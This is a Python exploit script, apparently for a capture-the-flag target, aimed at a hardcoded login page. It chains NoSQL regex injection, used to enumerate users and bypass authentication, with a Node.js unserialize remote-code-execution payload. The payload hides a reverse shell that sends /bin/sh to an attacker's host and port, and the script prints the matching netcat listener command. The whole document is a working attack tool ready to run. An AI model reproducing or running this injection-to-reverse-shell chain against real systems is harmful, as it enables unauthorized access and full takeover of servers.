# Exploit FoodWH
# Author : HaoNH

#!/usr/bin/python
import string
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import sys
import Queue
import threading
from colorama import Fore
from time import sleep
import base64
import json
import os

if len(sys.argv) != 3:
    print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
    sys.exit(0)

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]


#Global variable
characters = string.printable
for ch in string.printable:
	if ch in "$^&*|.+\?":
		characters = characters.replace(ch, '')
loop = True
finalout = ""
count = 0
queue = Queue.Queue()
max_thread = 100
url = "http://15.165.89.5/login"
para1 ="username"
para2 ="password"
methods = "post"
user_admin =""

def put_queue(t):
	#Check if threads < max start threads else put to queue
	global queue
	if threading.active_count() > max_thread:
            if t not in queue.queue:
                queue.put(t)
        else:
            try:
				t.start()
				threads.append(t)
            except:
                return


def pop_queue():
	#Get threads in queue and start
	if threading.active_count() < (max_thread):
		if not queue.empty():
			t = queue.get_nowait()
			try:
				t.start()
				threads.append(t)
			except:
				return


def method(url, para):
	session = requests.Session()
	# sleep(0.01)
	retry = Retry(connect=10, backoff_factor=0.5)
	adapter = HTTPAdapter(max_retries=retry)
	session.mount('http://', adapter)
	session.mount('https://', adapter)
	if methods:
		if methods[0] == "p" or methods[0] == "P":
			return session.post(url, data=para, allow_redirects=False)
		elif methods[0] == "g" or methods[0] == "G":
			return session.get(url, params=para, allow_redirects=False)
		else:
			print(Fore.RED + "Error: Invalid method")
			exit(0)
	else:
		return session.post(url, data=para, allow_redirects=False)

def Loopfindalldata(userpass):
	loop = True
	global finalout
	global count
	global user_admin
	global queue
	finded = False
	payload =''
	characters = string.printable
	for ch in string.printable:
		if ch in "$^&*|.+\?":
			characters = characters.replace(ch, '')

	
	for char in characters[:-6]:
		if char == '':
			continue
		session = requests.Session()
		retry = Retry(connect=10, backoff_factor=0.5)
		adapter = HTTPAdapter(max_retries=retry)
		session.mount('http://', adapter)
		session.mount('https://', adapter)
		payload = userpass + char
		para = {para1 + '[$regex]' : "^" + payload + ".*", para2 + '[$gt]' : '' }
		r = session.post(url, data=para, allow_redirects=False)
		if r.status_code == 302:
			finded = True
			print(Fore.YELLOW + "Pattern found: " + payload)
			t = threading.Thread(target=Loopfindalldata, args = (payload,))
			put_queue(t)
	if not finded:
		session = requests.Session()
		retry = Retry(connect=5, backoff_factor=0.5)
		adapter = HTTPAdapter(max_retries=retry)
		session.mount('http://', adapter)
		session.mount('https://', adapter)
		para = {para1: userpass, para2 + '[$gt]' : '' }
		r = session.post(url, data=para, allow_redirects=True)
		# r = session.get("http://15.165.89.5/")
		if "have permission" not in r.text:
			print(Fore.GREEN +" Found User Admin: "  + userpass)
			print(Fore.YELLOW + " [+] Sending payload to exploit.")
			queue.queue.clear()
			payload = exploit_unserialize(IP_ADDR,PORT)
			print(Fore.YELLOW + " [+] Using payload:")
			print payload
			print(Fore.YELLOW +  " [+] Auto submit payload in form checktoken.")
			user_admin = userpass
			para = {"token" : payload}
			r = session.post("http://15.165.89.5/checktoken", data=para, allow_redirects=False)
			print(Fore.GREEN+ "Exploit done check session in your VPS")
			os._exit(1)
		# else: 
		# 	print "Not found"
		# 	print r.text
		print(Fore.GREEN + para1 + " found: "  + userpass)
		finalout +=  userpass + "\n"
		count += 1;
	pop_queue()

def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]
def exploit_unserialize(IP_ADDR,PORT):
	NODEJS_REV_SHELL = '''
	var net = require('net');
	var spawn = require('child_process').spawn;
	HOST="%s";
	PORT="%s";
	TIMEOUT="5000";
	if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
	function c(HOST,PORT) {
		var client = new net.Socket();
		client.connect(PORT, HOST, function() {
			var sh = spawn('/bin/sh',[]);
			client.write("Connected!\\n");
			client.pipe(sh.stdin);
			sh.stdout.pipe(client);
			sh.stderr.pipe(client);
			sh.on('exit',function(code,signal){
			client.end("Disconnected!\\n");
			});
		});
		client.on('error', function(e) {
			setTimeout(c(HOST,PORT), TIMEOUT);
		});
	}
	c(HOST,PORT);
	''' % (IP_ADDR, PORT)
	# print "[+] Encoding"
	PAYLOAD = charencode(NODEJS_REV_SHELL)
	poc = {"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(%s))}()"% (PAYLOAD)}
	# print poc
	return base64.b64encode(json.dumps(poc).encode("utf-8"))

#MAIN
print(Fore.YELLOW + "Sure VPS run revserver shell: nc -lnvp " + str(PORT)+" on server "+ IP_ADDR)
	
threads =[]
for firstChar in characters:
	para = {para1 + '[$regex]' : "^" + firstChar + ".*", para2 + '[$gt]' : '' }
	r = method(url, para)
	#Status code if login true.
	if r.status_code != 302:
			continue;

	loop = True
	print(Fore.GREEN + "Pattern found that starts with '" + firstChar + "'")
	userpass = firstChar
	t = threading.Thread(target=Loopfindalldata, args = (firstChar,))
	put_queue(t)

for i in threads:
	i.join()

if finalout != "":
	print("\n" + str(count) + " " + para1 + "(s) found:")
	print(Fore.RED + finalout)
else:
	print(Fore.RED + "No " + para1 + " found")
print(Fore.GREEN + "ADMIN USER FOUND " + user_admin)

listusername = []
